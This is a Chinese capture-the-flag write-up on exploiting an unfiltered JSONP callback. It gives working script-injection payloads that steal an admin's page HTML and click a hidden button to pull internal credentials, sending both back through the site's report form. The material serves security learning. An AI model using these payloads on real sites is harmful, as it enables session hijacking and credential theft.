#### 神秘的Jsonp

这个玩意是老东西了，虽然现在学习价值不大，但是我特么的还是去和DSH死磕这个玩意了！详见我另一个文档`Jsonp.md`！

简单的说，就是该网页下存在着一段神秘标签

```html
<script>function showNotice(d){var e=document.getElementById("nt");if(e)e.textContent=d.text}</script><script src="/api/jsonp?callback=showNotice"></script></body></html>
```

然后这个路由`/api/jsonp?callback=showNotice`的执行结果是`{callback}(当前无待办公告。)`，按照这样拼接然后返回到这个script标签。

关键的是，这个`callback`参数没有任何过滤，也就是说，咱们想注入什么js代码都可以了！只要最后加一个注释符号`//`，把后面的文字注释掉即可。

当然咱们还是假设管理员那边会点开举报单，这样咱们的js代码才能得以渲染。

那就按照这个办法注入一段js代码，代码意思为：创建一个新的举报单，然后顺便外带自己页面的HTML代码出来。

```javascript
fetch('/report',{
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'reason=LOOT&content='+encodeURIComponent(document.documentElement.outerHTML)
})
```

payload如下：

```html
<script src="/api/jsonp?callback=fetch('%2Freport'%2C%7Bmethod%3A'POST'%2Cheaders%3A%7B'Content-Type'%3A'application%2Fx-www-form-urlencoded'%7D%2Cbody%3A'reason%3DLOOT%26content%3D'%2BencodeURIComponent(document.documentElement.outerHTML)%7D)%2F%2F"></script>
```

提交举报单后可以同样的payload多回复几次，然后就发现本次举报id的下一id的举报单生成了。访问它就可以得到管理员页面的HTML代码，其中关键信息如下：

```html
<p class="sub">点击加载本次举报关联的内部凭据（仅管理员可见）。</p>
<button id="vbtn" class="btn ghost" style="margin-top:8px">加载内部凭据</button>
```

还需要点一个鬼按钮，但是不怕，咱们都能任意注入js代码了，还怕个"鬼"？

哈哈话说大了，其实我根本不会写js代码，但是可以让DSH帮我们写！

```javascript
addEventListener('load',function(){
  var b=document.getElementById('vbtn'), s=b?'OK':'NOVBTN';
  if(b)b.click();
  setTimeout(function(){
    fetch('/report',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'reason=CRED&content='+encodeURIComponent(s+'|'+document.documentElement.outerHTML)})
  },2500)
})
```

DSH说这段代码处理了关于异步、延迟的问题，呃我加油。

payload如下：

```html
<script src="/api/jsonp?callback=addEventListener('load'%2Cfunction()%7Bvar%20b%3Ddocument.getElementById('vbtn')%2Cs%3Db%3F'OK'%3A'NOVBTN'%3Bif(b)b.click()%3BsetTimeout(function()%7Bfetch('%2Freport'%2C%7Bmethod%3A'POST'%2Cheaders%3A%7B'Content-Type'%3A'application%2Fx-www-form-urlencoded'%7D%2Cbody%3A'reason%3DCRED%26content%3D'%2BencodeURIComponent(s%2B'%7C'%2Bdocument.documentElement.outerHTML)%7D)%7D%2C2500)%7D)%2F%2F"></script>
```

按照刚刚的方法，就能得到点开按钮后的html页面。搜索一下vmc就能找到flag啦！

#### 关CSP什么事？

CSP对这题的影响可能在于script标签能否跨域。

但是无所谓，因为这个jsonp的路由`/api/jsonp`本身就是同源的，无所谓了。

#### 为什么想到Jsonp？

建议先看另一篇文章。

jsonp本来是早期用于解决跨域获取数据问题的方案，也就是本来这个src的目标应该是其他域的；但是这里很矛盾，本来就是同域的数据，非要做一个jsonp来获取，这明显是故意的，这就是题目专门留下的漏洞。

不过jsonp也不算特别安全就是了！
